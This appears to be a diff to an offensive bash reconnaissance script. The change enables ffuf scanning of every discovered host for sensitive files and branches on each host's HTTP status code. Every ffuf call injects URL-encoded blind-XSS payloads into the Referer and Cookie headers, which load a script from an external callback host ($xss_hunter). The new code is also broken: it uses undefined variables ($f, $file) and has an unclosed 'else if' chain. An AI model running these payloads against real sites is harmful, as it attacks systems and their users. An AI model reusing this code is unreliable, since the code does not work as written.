@@ -432,16 +432,30 @@ fi
 rm ~/recon/$1/$1-temp-vhost-wordlist.txt
 sleep 5
 
-# echo "[+] Dir and Files Scanning for Sensitive Files [+]"
-# if [ ! -z $(which ffuf) ]; then
-# 	for f in $(cat ~/recon/$1/$1-httprobe.txt); do file=$(echo $f | sed 's/http\(.?*\)*:\/\///g'); ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -o ~/recon/$1/dirsearch/$file.html; done
-# 	message "Dir%20and%20files%20Scan%20Done%20for%20$1"
-# 	echo "[+] Done ffuf for file and directory scanning"
-# else
-# 	message "[-]%20Skipping%20ffuf%20for%20dir%20and%20files%20scanning"
-# 	echo "[!] Skipping ..."
-# fi
-# sleep 5
+echo "[+] Dir and Files Scanning for Sensitive Files [+]"
+if [ ! -z $(which ffuf) ]; then
+	for i in $(cat ~/recon/$1/$1-httprobe.txt); do
+		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
+		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
+		if [ 404 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
+		else if [ 403 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
+		else if [ 401 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
+		else if [ 200 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
+		else
+			echo "$i >> $stat_code"
+		fi
+	done
+	message "Dir%20and%20files%20Scan%20Done%20for%20$1"
+	echo "[+] Done ffuf for file and directory scanning"
+else
+	message "[-]%20Skipping%20ffuf%20for%20dir%20and%20files%20scanning"
+	echo "[!] Skipping ..."
+fi
+sleep 5
 
 [ ! -f ~/$1.out ] && mv ~/$1.out ~/recon/$1/ 
 message "Scanner%20Done%20for%20$1"
